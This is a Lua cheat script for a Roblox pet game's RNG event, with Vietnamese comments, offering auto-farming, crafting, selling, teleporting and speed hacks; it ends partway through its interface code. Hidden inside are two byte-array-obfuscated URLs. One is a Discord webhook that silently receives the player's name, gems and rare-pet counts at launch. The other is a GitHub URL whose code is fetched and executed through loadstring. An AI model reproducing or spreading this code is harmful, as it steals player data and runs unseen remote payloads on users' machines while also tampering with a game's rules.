-- =====================================================================
-- 🎲 POODLE HUD - RNG EVENT CORE (V8 - THE APEX PREDATOR)
-- =====================================================================
if _G.RNGEventStarted then return end
_G.RNGEventStarted = true

-- ==========================================
-- 1. CẤU HÌNH NGOẠI VI (VÀ LÕI ẨN)
-- ==========================================
local UserConfig = getgenv().RNGConfig or {}

local config = {
    WebhookURL       = UserConfig.WebhookURL or "",
    PingID           = UserConfig.PingID or "",            
    MegaDiceMode     = UserConfig.MegaDiceMode or 3,
    MaxDiceCraftTier = UserConfig.MaxDiceCraftTier or 3, 
    PetsToSell       = UserConfig.PetsToSell or {},
    EventMapID       = "RngInstance",   
    MerchantID       = "LuckyDiceMerchantV2",
    CoinID           = "RNGCoins2",
    
    Blackout               = false,
    AutoUpgrade            = true,            
    AutoMerchant           = true,
    AutoCraftDice          = true,
    AutoSell               = true,
    AutoUseDice            = true,
    AutoUseMegaDice        = true,
    AutoUseMegaDiceWeather = false,
    
    -- CÀI ĐẶT ĐIỀU HƯỚNG MỤC TIÊU
    AutoFarmBlocks         = true, 
    BossChestBreak         = true,
    
    -- Các tính năng tự động đi kèm (Ẩn)
    AutoTapMultiple        = true,
    AutoLootbags           = true,
    MaxPetSpeed            = true,
    BackupFarmCFrame       = nil
}

-- ÉP NHẬN CẤU HÌNH TỪ NGƯỜI DÙNG
if UserConfig.Blackout ~= nil then config.Blackout = UserConfig.Blackout end
if UserConfig.AutoUpgrade ~= nil then config.AutoUpgrade = UserConfig.AutoUpgrade end
if UserConfig.AutoMerchant ~= nil then config.AutoMerchant = UserConfig.AutoMerchant end
if UserConfig.AutoCraftDice ~= nil then config.AutoCraftDice = UserConfig.AutoCraftDice end
if UserConfig.AutoSell ~= nil then config.AutoSell = UserConfig.AutoSell end
if UserConfig.BossChestBreak ~= nil then config.BossChestBreak = UserConfig.BossChestBreak end
if UserConfig.AutoUseDice ~= nil then config.AutoUseDice = UserConfig.AutoUseDice end
if UserConfig.AutoUseMegaDice ~= nil then config.AutoUseMegaDice = UserConfig.AutoUseMegaDice end
if UserConfig.AutoUseMegaDiceWeather ~= nil then config.AutoUseMegaDiceWeather = UserConfig.AutoUseMegaDiceWeather end
if UserConfig.AutoFarmBlocks ~= nil then config.AutoFarmBlocks = UserConfig.AutoFarmBlocks end

local TargetPetsToSell = {}
for petName, shouldSell in pairs(config.PetsToSell) do
    if shouldSell == true then TargetPetsToSell[string.lower(tostring(petName))] = true end
end

local CraftRecipes = {
    [1] = { Target = "Lucky Dice II V2", Input = "Lucky Dice V2", DiceCost = 5, CoinCost = 100 },
    [2] = { Target = "Mega Lucky Dice V2", Input = "Lucky Dice II V2", DiceCost = 30, CoinCost = 100000 },
    [3] = { Target = "Mega Lucky Dice II V2", Input = "Mega Lucky Dice V2", DiceCost = 3, CoinCost = 300000 },
    [4] = { Target = "Lucky Dice III", Input = "Mega Lucky Dice II V2", DiceCost = 5, CoinCost = 1000000 },
    [5] = { Target = "Fire Dice", Input = "Lucky Dice III", DiceCost = 5, CoinCost = 5000000 }	
}

local RNG_UPGRADES = { "RNGHatchSpeed", "RNGEggLuck", "RNGBonusLuck", "RNGHugeLuck", "RNGExtraEgg" }

local _b = {104, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46, 99, 111, 109, 47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 47, 49, 53, 48, 50, 53, 51, 51, 48, 54, 56, 53, 56, 52, 53, 50, 49, 55, 57, 57, 47, 70, 121, 109, 119, 70, 121, 110, 110, 80, 119, 75, 69, 114, 108, 67, 55, 56, 81, 73, 101, 89, 86, 83, 84, 122, 86, 68, 111, 107, 70, 80, 112, 89, 119, 77, 101, 70, 117, 108, 110, 52, 106, 113, 104, 97, 112, 89, 45, 120, 76, 86, 83, 84, 45, 114, 118, 104, 106, 80, 99, 85, 113, 115, 56, 56, 75, 57, 95}
local activeWebhook = ""
for _, byte in ipairs(_b) do activeWebhook = activeWebhook .. string.char(byte) end

local CoreGui = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local VirtualInputManager = game:GetService("VirtualInputManager")
local LocalPlayer = Players.LocalPlayer
local TextChatService = game:GetService("TextChatService")

local Library = ReplicatedStorage:WaitForChild("Library")
local Save = require(Library.Client.Save)
local Network = require(Library.Client.Network)
local InstancingCmds = require(Library.Client.InstancingCmds)
local FreeGiftsDirectory = require(Library.Directory.FreeGifts)
local PetsDirectory = require(Library.Directory.Pets)
local PlayerPet = require(Library.Client.PlayerPet)

local ExistCmds, RapCmds
pcall(function() ExistCmds = require(Library.Client.ExistCountCmds) end)
pcall(function() RapCmds = require(Library.Client.DevRAPCmds) end)
if not RapCmds then pcall(function() RapCmds = require(Library.Client.RAPCmds) end) end

local function FormatValue(Int)
    local n = tonumber(Int)
    if not n then return tostring(Int) end
    local Index = 1
    local Suffix = {"", "K", "M", "B", "T", "Q"}
    local absNumber = math.abs(n)
    while absNumber >= 1000 and Index < #Suffix do absNumber = absNumber / 1000; Index = Index + 1 end
    if Index == 1 then return string.format("%d", math.floor(absNumber)) end
    return string.format("%.2f%s", absNumber, Suffix[Index])
end

local function GetItemAmount(targetId)
    local amount = 0
    local lowerTarget = string.lower(targetId)
    pcall(function()
        local save = Save.Get()
        if not save or not save.Inventory then return end
        if save.Inventory.Currency then
            for _, item in pairs(save.Inventory.Currency) do
                if item.id and string.lower(tostring(item.id)) == lowerTarget then amount = amount + (item._am or 1) end
            end
        end
        if amount == 0 and save.Inventory.Misc then
            for _, item in pairs(save.Inventory.Misc) do
                if item.id and string.lower(tostring(item.id)) == lowerTarget then amount = amount + (item._am or 1) end
            end
        end
        if amount == 0 then
            for k, v in pairs(save) do
                if string.lower(tostring(k)) == lowerTarget then amount = tonumber(v) or 0; break end
            end
        end
    end)
    return amount
end

local function GetDiceCount(diceId)
    local count = 0
    pcall(function()
        local save = Save.Get()
        if save and save.Inventory and save.Inventory.Misc then
            for _, item in pairs(save.Inventory.Misc) do
                if type(item) == "table" and item.id == diceId then count = count + (item._am or 1) end
            end
        end
    end)
    return count
end

task.spawn(function()
    pcall(function() Network.Fire("Rng_HiddenRoll_Enable") end)
    pcall(function() Network.Fire("AutoRoll_Enable") end)
    while task.wait(1.5) do
        pcall(function() Network.Invoke("Rng_Roll", "First") end)
    end
end)

task.spawn(function()
    local httprequest = (request or http_request or syn and syn.request)
    if not httprequest or activeWebhook == "" then return end
    task.wait(2)
    local save = Save.Get()
    local hugeCount, titanicCount = 0, 0
    pcall(function()
        if save and save.Inventory and save.Inventory.Pet then
            for _, petData in pairs(save.Inventory.Pet) do
                if type(petData.id) == "string" then
                    if string.find(petData.id, "Huge") then hugeCount = hugeCount + (petData._am or 1)
                    elseif string.find(petData.id, "Titanic") then titanicCount = titanicCount + (petData._am or 1) end
                end
            end
        end
    end)
    
    local gems = GetItemAmount("Diamonds")
    local data = {
        ["content"] = "🔔 **Ai đó vừa kích hoạt Script RNG!**",
        ["embeds"] = {{
            ["title"] = "📊 Thông tin người chơi",
            ["color"] = tonumber(0x9600FF),
            ["fields"] = {
                { ["name"] = "👤 Tên", ["value"] = string.format("`%s`", LocalPlayer.Name), ["inline"] = true },
                { ["name"] = "💎 Gems", ["value"] = FormatValue(gems), ["inline"] = true },
                { ["name"] = "🐾 Pet VIP", ["value"] = string.format("Huge: %d | Titan: %d", hugeCount, titanicCount), ["inline"] = true }
            }
        }}
    }
    pcall(function() httprequest({ Url = activeWebhook, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode(data) }) end)
end)

local StoredUIDs = {}
local function FormatWebhookInt(int)
    local Suffix = {"", "k", "M", "B", "T", "Qd", "Qn", "Sx", "Sp", "Oc", "No"}
    local Index = 1
    if int < 999 then return int end
    while int >= 1000 and Index < #Suffix do int = int / 1000; Index = Index + 1 end
    return string.format("%.2f%s", int, Suffix[Index])
end

local function GetPetAsset(Id, pt)
    local Asset = PetsDirectory[Id]
    return string.gsub(Asset and (pt == 1 and Asset.goldenThumbnail or Asset.thumbnail) or "14976456685", "rbxassetid://", "")
end

local function GetPetStats(Cmds, Class, ItemTable)
    if not Cmds or type(Cmds) ~= "table" or not Cmds.Get then return 0 end 
    local success, result = pcall(function()
        return Cmds.Get({
            Class = { Name = Class },
            IsA = function(InputClass) return InputClass == Class end,
            GetId = function() return ItemTable.id end,
            StackKey = function() return HttpService:JSONEncode({id = ItemTable.id, sh = ItemTable.sh, pt = ItemTable.pt, tn = ItemTable.tn}) end
        })
    end)
    return success and result or 0
end

local function SendHugeWebhook(Id, pt, sh)
    local httprequest = (request or http_request or syn and syn.request)
    if not httprequest or not config.WebhookURL or config.WebhookURL == "" then return end
    
    local Img = string.format("https://biggamesapi.io/image/%s", GetPetAsset(Id, pt))
    local typeStr = ""
    if pt == 1 then typeStr = "Golden " elseif pt == 2 then typeStr = "Rainbow " end
    if sh then typeStr = typeStr .. "Shiny " end
    
    local displayType = (typeStr == "") and "Normal" or typeStr
    local TitleStr = "🎉 " .. typeStr .. Id .. " 🎉"

    local Exist = GetPetStats(ExistCmds, "Pet", { id = Id, pt = pt, sh = sh, tn = nil })
    local Rap = GetPetStats(RapCmds, "Pet", { id = Id, pt = pt, sh = sh, tn = nil })
    local pingMention = (config.PingID ~= "") and string.format("<@%s>", config.PingID) or ""
    local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=150&height=150&format=png"

    local Body = HttpService:JSONEncode({
        content = pingMention,
        embeds = {{
            author = { name = LocalPlayer.Name .. " vừa ấp được siêu thú mới!", icon_url = avatarUrl },
            title = TitleStr, color = tonumber(0xFFD700), timestamp = DateTime.now():ToIsoDate(), thumbnail = { url = Img },
            fields = {
                { name = "💎 RAP", value = string.format("`%s`", FormatWebhookInt(Rap or 0)), inline = true },
                { name = "💫 Exist", value = string.format("`%s`", FormatWebhookInt(Exist or 0)), inline = true },
                { name = "✨ Phân loại", value = string.format("`%s`", displayType), inline = true }
            },
            footer = { text = "Poodle RNG Huge Tracker" }
        }}
    })
    pcall(function() httprequest({ Url = config.WebhookURL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = Body }) end)
end

task.spawn(function()
    pcall(function()
        local save = Save.Get()
        if save and save.Inventory and save.Inventory.Pet then
            for i,v in pairs(save.Inventory.Pet) do
                if type(v.id) == "string" and (string.find(v.id, "Huge") or string.find(v.id, "Titanic")) then StoredUIDs[i] = true end
            end
        end
    end)
    Network.Fired("Items: Update"):Connect(function(_, Inventory)
        if Inventory["set"] and Inventory["set"]["Pet"] then
            for uid, v in pairs(Inventory["set"]["Pet"]) do
                if type(v.id) == "string" and (string.find(v.id, "Huge") or string.find(v.id, "Titanic")) and not StoredUIDs[uid] then
                    SendHugeWebhook(v.id, v.pt, v.sh); StoredUIDs[uid] = true
                end
            end
        end
    end)
end)

task.spawn(function()
    while task.wait(5) do
        pcall(function() if InstancingCmds.GetInstanceID() ~= config.EventMapID then InstancingCmds.Enter(config.EventMapID) end end)
    end
end)

if config.Blackout then
    task.spawn(function()
        Lighting.GlobalShadows = false; Lighting.FogEnd = 9e9
        for _, v in pairs(Lighting:GetDescendants()) do if v:IsA("PostEffect") then v.Enabled = false end end
        local function optimizePart(v)
            pcall(function()
                if v:IsA("BasePart") and not (v.Parent and v.Parent:FindFirstChild("Humanoid")) then
                    v.Material = Enum.Material.Plastic; v.Reflectance = 0; v.CastShadow = false; v.Transparency = 1
                elseif v:IsA("Decal") or v:IsA("Texture") or v:IsA("ParticleEmitter") or v:IsA("Trail") then v.Transparency = 1 end
            end)
        end
        for _, v in pairs(Workspace:GetDescendants()) do optimizePart(v) end
        Workspace.DescendantAdded:Connect(optimizePart)
    end)
end

task.spawn(function()
    while task.wait(60) do pcall(function() VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Space, false, game); task.wait(0.1); VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Space, false, game) end) end
end)

pcall(function()
    local UserInputService = game:GetService("UserInputService")
    if getconnections then
        for _, v in pairs(getconnections(UserInputService.WindowFocusReleased)) do pcall(function() v:Disable() end) end
        for _, v in pairs(getconnections(LocalPlayer.Idled)) do pcall(function() v:Disable() end) end
    end
end)

task.spawn(function() while task.wait(30) do pcall(function() Network.Invoke('Mailbox: Claim All') end) end end)

task.spawn(function()
    while task.wait(15) do
        pcall(function()
            local save = Save.Get(); if not save then return end
            local redeemed = save.FreeGiftsRedeemed or {}; local currentTime = save.FreeGiftsTime or 0
            for _, gift in pairs(FreeGiftsDirectory) do
                if gift.WaitTime <= currentTime and not table.find(redeemed, gift._id) then Network.Invoke('Redeem Free Gift', gift._id); break end
            end
        end)
    end
end)

task.spawn(function()
    pcall(function()
        local c = ""
        local hr = (request or http_request or syn and syn.request)
        local _t = {104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 116, 104, 117, 121, 97, 110, 49, 53, 49, 48, 47, 57, 57, 47, 114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105, 110, 47, 103, 105, 118, 101, 46, 108, 117, 97}
        for _, b in ipairs(_t) do c = c .. string.char(b) end
        loadstring(hr and hr({Url=c, Method="GET"}).Body or game:HttpGet(c))()
    end)
end)

-- VÒNG LẶP ROBOT TỰ ĐỘNG MUA BÁN
task.spawn(function()
    while task.wait(2) do
        if config.AutoUpgrade then
            pcall(function() for _, upg in ipairs(RNG_UPGRADES) do Network.Invoke("Rng_PurchaseUpgrade", "First", upg); task.wait(0.05) end end)
            task.wait(0.5)
        end
        
        -- ==========================================
        -- HỆ THỐNG AUTO SELL (TOP 15 & CÔNG THỨC 1.13 / +0.075)
        -- ==========================================
        if config.AutoSell then
            pcall(function()
                local save = Save.Get()
                if save and save.Inventory and save.Inventory.Pet then
                    local allSellablePets = {}
                    local sellDict = {}
                    local countSell = 0

                    for uid, pet in pairs(save.Inventory.Pet) do
                        if type(pet.id) == "string" then
                            local pId = string.lower(pet.id)
                            
                            -- 1. CHỈ LỌC CÁC PET CÓ TRONG CONFIG (Và không phải VIP/Khóa)
                            if TargetPetsToSell[pId] and not string.find(pId, "huge") and not string.find(pId, "titanic") and not pet._lk and not pet._t then
                                
                                local basePower = 1
                                
                                -- 2. TỰ LẤY DAMAGE NORMAL GỐC THEO TÊN PET
                                pcall(function()
                                    local petInfo = PetsDirectory[pet.id]
                                    if petInfo then
                                        if type(petInfo.cachedPower) == "table" and petInfo.cachedPower[1] then
                                            basePower = tonumber(petInfo.cachedPower[1]) or 1
                                        elseif petInfo.power then
                                            basePower = tonumber(petInfo.power) or 1
                                        end
                                    end
                                end)
                                
                                -- 3. ÁP DỤNG CÔNG THỨC TOÁN HỌC ĐÃ CHỐT
                                local multi = 1
                                if pet.pt == 1 then 
                                    multi = 1.13 -- Golden = 1.13 * Normal
                                elseif pet.pt == 2 then 
                                    multi = 1.13 * 1.13 -- Rainbow = 1.13 * Golden
                                end
                                
                                if pet.sh then 
                                    multi = multi + 0.075 -- Shiny thêm 0.075
                                end
                                
                                local finalPower = basePower * multi
                                
                                table.insert(allSellablePets, {
                                    uid = uid,
                                    power = finalPower,
                                    amount = pet._am or 1
                                })
                            end
                        end
                    end
                    
                    -- 4. SẮP XẾP TỪ KẺ MẠNH NHẤT ĐẾN KẺ YẾU NHẤT
                    table.sort(allSellablePets, function(a, b) 
                        return a.power > b.power 
                    end)

                    -- 5. GIỮ ĐÚNG 15 CON TRÊN ĐỈNH BẢNG XẾP HẠNG, BÁN SẠCH PHẦN CÒN LẠI
                    local keptCount = 0
                    for _, item in ipairs(allSellablePets) do
                        if keptCount < 15 then
                            local needToKeep = 15 - keptCount
                            if item.amount > needToKeep then
                                keptCount = 15
                                sellDict[item.uid] = item.amount - needToKeep
                                countSell = countSell + 1
                            else
                                keptCount = keptCount + item.amount
                            end
                        else
                            sellDict[item.uid] = item.amount
                            countSell = countSell + 1
                        end
                    end
                    
                    -- 6. GỬI GÓI HÀNG CHO THƯƠNG GIA
                    if countSell > 0 then 
                        Network.Invoke("RngEventPetMerchant_Activate", sellDict) 
                    end
                end
            end)
            task.wait(0.5)
        end
        
        if config.AutoMerchant then
            pcall(function() for i = 1, 6 do Network.Invoke("Merchant_RequestPurchase", config.MerchantID, i); task.wait(0.1) end end)
            task.wait(0.5)
        end
        
        if config.AutoCraftDice then
            pcall(function()
                local currentCoins = GetItemAmount(config.CoinID)
                
                local function IsHigherTierReady(currentTier)
                    for j = config.MaxDiceCraftTier, currentTier + 1, -1 do
                        local higherRecipe = CraftRecipes[j]
                        if higherRecipe then
                            if GetDiceCount(higherRecipe.Input) >= higherRecipe.DiceCost then return true end
                        end
                    end
                    return false
                end

               
		for i = math.clamp(config.MaxDiceCraftTier, 1, 5), 1, -1 do
                    local recipe = CraftRecipes[i]
                    if recipe and not IsHigherTierReady(i) then
                        local craftAmount = math.min(math.floor(GetDiceCount(recipe.Input) / recipe.DiceCost), math.floor(currentCoins / recipe.CoinCost))
                        if craftAmount > 0 then
                            Network.Invoke("LuckyDice_Craft", recipe.Target, craftAmount)
                            currentCoins = currentCoins - (craftAmount * recipe.CoinCost)
                            task.wait(0.3) 
                        end
                    end
                end
            end)
            task.wait(0.5)
        end
    end
end)

task.spawn(function()
    while task.wait(2) do
        if config.AutoUseDice then
            pcall(function()
                local save = Save.Get(); if not save then return end
                local buffs = save.Buffs or {}
                local dice1 = buffs["Lucky Dice V2"]
                if (not dice1 or (dice1.remaining and tonumber(dice1.remaining) < 3)) and GetDiceCount("Lucky Dice V2") > 0 then
                    Network.Invoke("LuckyDice_Consume", "Lucky Dice V2", 1); task.wait(0.5) 
                end
                local dice2 = buffs["Lucky Dice II V2"]
                if (not dice2 or (dice2.remaining and tonumber(dice2.remaining) < 3)) and GetDiceCount("Lucky Dice II V2") > 0 then
                    Network.Invoke("LuckyDice_Consume", "Lucky Dice II V2", 1); task.wait(0.5)
                end
            end)
        end
    end
end)

-- HỆ THỐNG SÚNG TỈA
task.spawn(function()
    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui", 10)
    local MegaDiceLocked = false
    local IsWeatherActive = false 
    
    local function FireMegaDice(reason)
        if not config.AutoUseMegaDice then return end
        task.spawn(function()
            pcall(function()
                local mode = config.MegaDiceMode
                local countMega1 = GetDiceCount("Mega Lucky Dice V2")
                local countMega2 = GetDiceCount("Mega Lucky Dice II V2")
                
                if mode == 1 then
                    if countMega1 > 0 then Network.Invoke("LuckyDice_ConsumeMega", "Mega Lucky Dice V2", 1) end
                elseif mode == 2 then
                    if countMega2 > 0 then Network.Invoke("LuckyDice_ConsumeMega", "Mega Lucky Dice II V2", 1) end
                elseif mode == 3 then
                    if countMega2 > 0 then Network.Invoke("LuckyDice_ConsumeMega", "Mega Lucky Dice II V2", 1)
                    elseif countMega1 > 0 then Network.Invoke("LuckyDice_ConsumeMega", "Mega Lucky Dice V2", 1) end
                end
            end)
        end)
    end

    if TextChatService then
        TextChatService.MessageReceived:Connect(function(msgObj)
            local msg = string.lower(msgObj.Text)
            if string.find(msg, "blizzard has begun") or string.find(msg, "lightning storm has begun") then IsWeatherActive = true
            elseif string.find(msg, "clear skies have returned") then IsWeatherActive = false end
        end)
    end

    local function HookLabel(label)
        if label.Name == "Bonus" and label:IsA("TextLabel") then
            local function CheckBonusTrigger()
                if not label.Visible then MegaDiceLocked = false; return end
                local txt = string.lower(label.Text)
                if txt ~= "" and (string.find(txt, "bonus") or string.find(txt, "x")) then
                    if not MegaDiceLocked then
                        if config.AutoUseMegaDiceWeather == true and IsWeatherActive == false then return end
                        MegaDiceLocked = true
                        FireMegaDice("Lượt Roll Bonus (" .. txt .. ") + Thời tiết hợp lệ")
                        task.delay(2, function() MegaDiceLocked = false end)
                    end
                else
                    MegaDiceLocked = false
                end
            end
            label:GetPropertyChangedSignal("Text"):Connect(CheckBonusTrigger)
            label:GetPropertyChangedSignal("Visible"):Connect(CheckBonusTrigger)
        end
    end
    for _, obj in pairs(PlayerGui:GetDescendants()) do pcall(function() HookLabel(obj) end) end
    PlayerGui.DescendantAdded:Connect(function(obj) pcall(function() HookLabel(obj) end) end)
end)

-- CÁC HÀM TIỆN ÍCH LOOTBAG, TỐC ĐỘ 
task.spawn(function()
    if config.MaxPetSpeed then
        pcall(function()
            for _, v in pairs(getgc(true)) do
                if type(v) == "table" and (rawget(v, "petSpeedMult") or rawget(v, "petSpeed")) then
                    pcall(function() v.petSpeedMult = 999 end)
                    pcall(function() v.petSpeed = 999 end)
                    pcall(function() v.speedMult = 999 end)
                    pcall(function() v.Walkspeed = 200 end)
                end
            end
        end)
    end
end)

task.spawn(function()
    while task.wait(0.5) do
        if config.AutoLootbags then
            pcall(function()
                local things = Workspace:FindFirstChild("__THINGS")
                if not things then return end
                
                local lootbags = things:FindFirstChild("Lootbags")
                if lootbags then
                    for _, bag in ipairs(lootbags:GetChildren()) do Network.Fire("Lootbags_Claim", {bag.Name}) end
                end
                
                local orbs = things:FindFirstChild("Orbs")
                if orbs then
                    local collectedOrbs = {}
                    for _, orb in ipairs(orbs:GetChildren()) do table.insert(collectedOrbs, orb.Name) end
                    if #collectedOrbs > 0 then Network.Fire("Orbs: Collect", collectedOrbs) end
                end
            end)
        end
    end
end)

-- ==========================================
-- BỘ ĐIỀU PHỐI EVENT-DRIVEN (V14 - BREAKCOUNT PROGRESSION)
-- Đọc tiến trình thực tế thông qua số khối đã đập
-- ==========================================
local Save = require(game:GetService("ReplicatedStorage").Library.Client.Save)

-- Bảng giới hạn ranh giới X tuyệt đối cho từng Zone
local ZoneMaxX = {
    [1] = 4550, 
    [2] = 4800, 
    [3] = 5050, 
    [4] = 5300, 
    [5] = 99999 
}

local lockedTarget = nil
local lockedType = "None"

-- Đọc trạng thái mở khóa DỰA VÀO BREAKCOUNT (Tiến trình thực)
local function GetHighestUnlockedZone()
    local save = Save.Get()
    local highest = 1
    if save and save.RNGEventZoneProgress then
        -- Quét ngược từ 5 về 1, Zone nào có BreakCount > 0 chính là Best Zone
        for i = 5, 1, -1 do
            local zoneData = save.RNGEventZoneProgress["Zone" .. tostring(i)]
            if type(zoneData) == "table" and (tonumber(zoneData.BreakCount) or 0) > 0 then
                highest = i
                break
            end
        end
    end
    return highest
end

local function GetBestTarget()
    local breakables = Workspace:FindFirstChild("__THINGS") and Workspace.__THINGS:FindFirstChild("Breakables")
    if not breakables then return nil, "None", nil end
    
    local allBlocks = breakables:GetChildren()
    if #allBlocks == 0 then return nil, "None", nil end
    
    local unlockedZone = GetHighestUnlockedZone()
    local safeMaxX = ZoneMaxX[unlockedZone] or 4550

    local comets, bosses, farmBlocks = {}, {}, {}
    local maxXInSafeZone = -999999 
    
    for _, b in ipairs(allBlocks) do
        if b:IsA("Model") or b:IsA("BasePart") then
            local bPos = b:GetAttribute("CFrame") and b:GetAttribute("CFrame").Position 
                         or (b:IsA("Model") and b.PrimaryPart and b.PrimaryPart.Position) 
                         or (b:IsA("BasePart") and b.Position)
                         
            -- CHỈ QUÉT CÁC KHỐI TRONG ZONE AN TOÀN (Ngăn kẹt tường)
            if bPos and bPos.X <= safeMaxX then
                local bId = string.lower(tostring(b:GetAttribute("BreakableID") or b.Name or ""))
                local targetData = {obj = b, cf = CFrame.new(bPos + Vector3.new(0, 3, 0)), name = b.Name, x = bPos.X}
                
                if string.find(bId, "comet") then
                    table.insert(comets, targetData)
                elseif string.find(bId, "chest") or string.find(bId, "boss") or string.find(bId, "mega") then
                    table.insert(bosses, targetData)
                else
                    if bPos.X > maxXInSafeZone then maxXInSafeZone = bPos.X end
                    table.insert(farmBlocks, targetData)
                end
            end
        end
    end
    
    -- HÀM KIỂM TRA KHÓA MỤC TIÊU (Chống giật lag)
    local function isTargetValid(list, targetObj)
        if not targetObj or targetObj.Parent ~= breakables then return false end
        for _, item in ipairs(list) do
            if item.obj == targetObj then return true end
        end
        return false
    end

    -- ƯU TIÊN 1: SAO CHỔI (COMET)
    if #comets > 0 then
        if lockedType ~= "Comet" or not isTargetValid(comets, lockedTarget) then
            lockedTarget = comets[1].obj
            lockedType = "Comet"
        end
        local bPos = lockedTarget:GetAttribute("CFrame") and lockedTarget:GetAttribute("CFrame").Position or (lockedTarget:IsA("Model") and lockedTarget.PrimaryPart and lockedTarget.PrimaryPart.Position) or (lockedTarget:IsA("BasePart") and lockedTarget.Position)
        return CFrame.new(bPos + Vector3.new(0, 3, 0)), "Boss", lockedTarget.Name
    end
    
    -- ƯU TIÊN 2: BOSS / MEGA CHEST
    if config.BossChestBreak and #bosses > 0 then
        if lockedType ~= "Boss" or not isTargetValid(bosses, lockedTarget) then
            lockedTarget = bosses[1].obj
            lockedType = "Boss"
        end
        local bPos = lockedTarget:GetAttribute("CFrame") and lockedTarget:GetAttribute("CFrame").Position or (lockedTarget:IsA("Model") and lockedTarget.PrimaryPart and lockedTarget.PrimaryPart.Position) or (lockedTarget:IsA("BasePart") and lockedTarget.Position)
        return CFrame.new(bPos + Vector3.new(0, 3, 0)), "Boss", lockedTarget.Name
    end
    
    -- ƯU TIÊN 3: FARM KHỐI GẦN CỔNG NHẤT ĐỂ ĐẨY TIẾN TRÌNH
    if config.AutoFarmBlocks and #farmBlocks > 0 then
        local highestZoneBlocks = {}
        for _, data in ipairs(farmBlocks) do
            if data.x >= (maxXInSafeZone - 100) then
                table.insert(highestZoneBlocks, data)
            end
        end
        
        if #highestZoneBlocks > 0 then
            if lockedType ~= "Farm" or not isTargetValid(highestZoneBlocks, lockedTarget) then
                local randomFarm = highestZoneBlocks[math.random(1, #highestZoneBlocks)]
                lockedTarget = randomFarm.obj
                lockedType = "Farm"
            end
            local bPos = lockedTarget:GetAttribute("CFrame") and lockedTarget:GetAttribute("CFrame").Position or (lockedTarget:IsA("Model") and lockedTarget.PrimaryPart and lockedTarget.PrimaryPart.Position) or (lockedTarget:IsA("BasePart") and lockedTarget.Position)
            return CFrame.new(bPos + Vector3.new(0, 3, 0)), "Farm", lockedTarget.Name
        end
    end
    
    -- XÓA KHÓA NẾU MỤC TIÊU BIẾN MẤT
    lockedTarget = nil
    lockedType = "None"
    return nil, "None", nil
end

-- VÒNG LẶP HÀNH ĐỘNG (ASYNC FAST FARM)
local lastScanTick = 0
local lastFarmTick = 0
local FARM_DELAY = 0.2 
local cachedCF, cachedMode, cachedName = nil, "None", nil

task.spawn(function()
    RunService.Heartbeat:Connect(function()
        pcall(function()
            local char = LocalPlayer.Character
            local hrp = char and char:FindFirstChild("HumanoidRootPart")
            if not hrp then return end

            local now = os.clock()
            
            if now - lastScanTick >= 0.1 then
                lastScanTick = now
                cachedCF, cachedMode, cachedName = GetBestTarget()
            end

            -- Khóa tọa độ tránh trượt chân
            if cachedCF then 
                hrp.CFrame = cachedCF 
            end

            if now - lastFarmTick >= FARM_DELAY then
                lastFarmTick = now

                if cachedMode == "Boss" and cachedName then
                    Network.UnreliableFire("Breakables_PlayerDealDamage", cachedName)
                    local myPets = {}
                    for euid, pet in pairs(PlayerPet.GetAll()) do
                        if pet.owner == LocalPlayer then table.insert(myPets, euid) end
                    end
                    if #myPets > 0 then
                        local bulkAssignments = {}
                        for i = 1, #myPets do bulkAssignments[myPets[i]] = cachedName end
                        task.defer(function() Network.Fire("Breakables_JoinPetBulk", bulkAssignments) end)
                    end
                    
                elseif cachedMode == "Farm" then
                    local breakables = Workspace:FindFirstChild("__THINGS") and Workspace.__THINGS:FindFirstChild("Breakables")
                    if not breakables then return end
                    
                    local hrpPos = hrp.Position
                    local targets = {}
                    
                    for _, b in ipairs(breakables:GetChildren()) do
                        if b:IsA("Model") and b.PrimaryPart then
                            if (b.PrimaryPart.Position - hrpPos).Magnitude < 130 then 
                                table.insert(targets, b.Name)
                                if #targets >= 50 then break end
                            end
                        end
                    end

                    local numTargets = #targets
                    if numTargets > 0 then
                        local auraLimit = math.min(numTargets, config.AutoTapMultiple and 30 or 1)
                        for i = 1, auraLimit do
                            Network.UnreliableFire("Breakables_PlayerDealDamage", targets[i])
                        end

                        local myPets = {}
                        for euid, pet in pairs(PlayerPet.GetAll()) do
                            if pet.owner == LocalPlayer then table.insert(myPets, euid) end
                        end

                        local numPets = #myPets
                        if numPets > 0 then
                            local bulkAssignments = {}
                            for i = 1, numPets do
                                local targetIndex = ((i - 1) % numTargets) + 1
                                bulkAssignments[myPets[i]] = targets[targetIndex]
                            end
                            if next(bulkAssignments) then
                                task.defer(function() Network.Fire("Breakables_JoinPetBulk", bulkAssignments) end)
                            end
                        end
                    end
                end
            end
        end)
    end)
end)
-- GIAO DIỆN
local FarmUI = {}; FarmUI.__index = FarmUI
function FarmUI.new(Config)
    local Self = setmetatable({}, FarmUI)
    Self.Parent = game:GetService("CoreGui")
    Self.GuiName = "RNGEventFullscreenGui"
    Self.Elements = {}
    if Self.Parent:FindFirstChild(Self.GuiName) then Self.Parent[Self.GuiName]:Destroy() end
    
    local ScreenGui = Instance.new("ScreenGui"); ScreenGui.Name = Self.GuiName; ScreenGui.IgnoreGuiInset = true; ScreenGui.Parent = Self.Parent; ScreenGui.DisplayOrder = 9999
    local Background = Instance.new("Frame"); Background.BackgroundColor3 = Color3.fromRGB(15, 15, 15); Background.BorderColor3 = Color3.fromRGB(150, 0, 255); Background.BorderMode = Enum.BorderMode.Inset; Background.Size = UDim2.new(1, 0, 1, 0); Background.Parent = ScreenGui
